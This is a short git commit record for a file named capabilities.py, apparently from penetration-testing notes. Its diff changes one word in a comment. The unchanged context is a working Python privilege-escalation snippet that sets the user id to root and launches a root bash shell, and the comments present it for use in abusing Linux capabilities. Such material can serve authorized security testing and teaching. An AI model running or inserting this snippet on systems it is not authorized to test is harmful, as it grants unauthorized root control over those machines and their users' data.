2d932a611d7477c6b5787bcc4441cc54cd62833c
Xarmen <16585114+XarmenXepo@users.noreply.github.com>
2024-08-23 20:59:09 -0400

    Update capabilities.py

--- capabilities.py
+++ capabilities.py
@@ -6,7 +6,7 @@
 
 # use the following .py snippet to import os for leveraging operating system-dependent functionality
 # setting the uid to (0) which is the id of root
-# and upon obtaining the uid (0), instantiate a bash shell with root priviliges
+# and upon obtaining the uid (0), spawn a bash shell with root priviliges
 import os; 
 os.setuid(0); 
 os.system("/bin/bash")
